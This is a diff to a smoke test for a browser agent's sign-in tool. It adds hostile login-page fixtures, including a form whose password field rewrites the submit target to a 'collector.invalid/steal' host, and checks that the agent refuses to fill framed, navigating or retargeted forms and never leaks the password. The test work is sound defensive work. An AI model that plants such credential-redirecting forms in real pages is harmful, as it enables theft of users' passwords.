@@ -150,6 +150,12 @@ function loginHtml(variant: string, frameOrigin: string): string {
     elsewhere: `<form method="post" action="https://collector.invalid/steal">${field('text', 'username', 'Username')}${field('password', 'password', 'Password')}</form>`,
     disguised: `<form method="post" action="/signed-in">${field('text', 'username', 'Username')}${field('text', 'password', 'Password', 'style="-webkit-text-security: disc"')}</form>`,
     framed: `<iframe title="Sign in" src="${frameOrigin}/login" width="600" height="400"></iframe>`,
+    // The same site in a frame: a field the agent names there is still refused.
+    framedsame: `<iframe title="Sign in" src="/login" width="600" height="400"></iframe>`,
+    // Leaves the page as soon as the username field takes focus, between resolving and typing.
+    navigates: `<form method="post" action="/signed-in">${field('text', 'username', 'Username', `onfocus="location.assign('/signed-in')"`)}${field('password', 'password', 'Password')}</form>`,
+    // Sends to another site once the password is typed, after every field was checked.
+    retarget: `<form method="post" action="/signed-in">${field('text', 'username', 'Username')}${field('password', 'password', 'Password', `oninput="this.form.setAttribute('action', 'https://collector.invalid/steal')"`)}</form>`,
     step: `<form method="post" action="/login">${field('email', 'email', 'Email', 'autocomplete="username"')}<button type="submit">Next</button></form>`
   }
   return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Sign in fixture</title></head><body><main>${forms[variant] ?? forms.login}</main></body></html>`
@@ -1020,6 +1026,45 @@ async function runSmoke(): Promise<SmokeResult> {
       passwordTarget: { selector: '#password' }
     })
     await refused('/login-framed', /No sign-in field/)
+    await refused(
+      '/login-navigates',
+      /page changed|no longer connected|retain focus|does not belong to the document/i
+    )
+    await refused('/login-retarget', /now sends to another site/, { submit: true })
+
+    // A field inside a frame, even the same site's, is out of the agent's reach: observations and
+    // selectors cover the page's own document, and naming the frame itself is refused.
+    await visit('/login-framedsame')
+    await waitFor(
+      async () =>
+        (
+          await service!.evaluate({
+            sessionId: login.sessionId,
+            expression: `Boolean(document.querySelector('iframe')?.contentDocument?.querySelector('#password'))`
+          })
+        ).value,
+      (loaded) => loaded === true,
+      'the framed sign-in fields'
+    )
+    const framed = await service.observe(login.sessionId, { screenshot: 'none' })
+    assert.equal(
+      framed.semanticSnapshot?.split('\n').some((line) => line.includes('"Password"')),
+      false,
+      'A framed field must not get a ref'
+    )
+    await assert.rejects(
+      signIn(login.sessionId, { passwordTarget: { selector: '#password' } }),
+      /not found/
+    )
+    await assert.rejects(
+      signIn(login.sessionId, { passwordTarget: { selector: 'iframe' } }),
+      /not an editable input/
+    )
+    const framedLeak = await service.evaluate({
+      sessionId: login.sessionId,
+      expression: `Array.from(document.querySelector('iframe').contentDocument.querySelectorAll('input')).some((field) => field.value === ${JSON.stringify(signInPassword)})`
+    })
+    assert.equal(framedLeak.value, false, 'framed field')
     await visit('/login-step')
     const stepped = await signIn(login.sessionId)
     assert.deepEqual(stepped.filled, ['username'])
